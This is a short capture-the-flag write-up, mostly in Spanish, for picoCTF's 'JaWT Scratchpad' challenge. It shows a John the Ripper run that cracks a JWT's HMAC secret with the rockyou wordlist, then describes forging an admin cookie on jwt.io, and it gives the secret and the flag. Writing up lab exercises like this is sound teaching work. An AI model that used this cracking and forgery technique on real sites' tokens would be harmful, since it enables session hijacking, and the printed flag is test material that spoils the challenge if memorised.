# JaWT Scratchpad

## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090

## Solución
```bash
┌──(emgeek㉿EmGeek-Kali-PC)-[~/Documents]  
└─$ nano hash  
                                                                                                                                                                        
┌──(emgeek㉿EmGeek-Kali-PC)-[~/Documents]  
└─$ john hash -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
0g 0:00:00:03 16.80% (ETA: 22:14:38) 0g/s 872951p/s 872951c/s 872951C/s yaritza88..yapa7  
0g 0:00:00:04 22.57% (ETA: 22:14:38) 0g/s 859136p/s 859136c/s 859136C/s sxc.com..swkotor2  
0g 0:00:00:05 27.52% (ETA: 22:14:39) 0g/s 822886p/s 822886c/s 822886C/s rustymc..rusli05  
0g 0:00:00:06 33.88% (ETA: 22:14:38) 0g/s 833877p/s 833877c/s 833877C/s nov122006..notrollingrock  
0g 0:00:00:07 40.26% (ETA: 22:14:38) 0g/s 841142p/s 841142c/s 841142C/s maggiehowe..magasawangbato  
0g 0:00:00:08 45.65% (ETA: 22:14:38) 0g/s 830976p/s 830976c/s 830976C/s kellybabii..kellek13  
ilovepico        (?)        
1g 0:00:00:08 DONE (2023-10-13 22:14) 0.1129g/s 835630p/s 835630c/s 835630C/s iloverob4live345..ilovepatri  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```
Usando el add-on de firefox Cookie-Editor extraje la cookie que se genera al iniciar sesion en la pagina, despues la puse dentro del archivo hash que se puede observar en el codigo, una vez teniendo la contraseña para esta cookie ingrese a https://jwt.io/ para editar la cookie, para despues ingresar la nueva cookie y la pagina nos lanzo esta bandera: picoCTF{jawt_was_just_what_you_thought_f859ab2f}


## Notas adicionales


## Referencias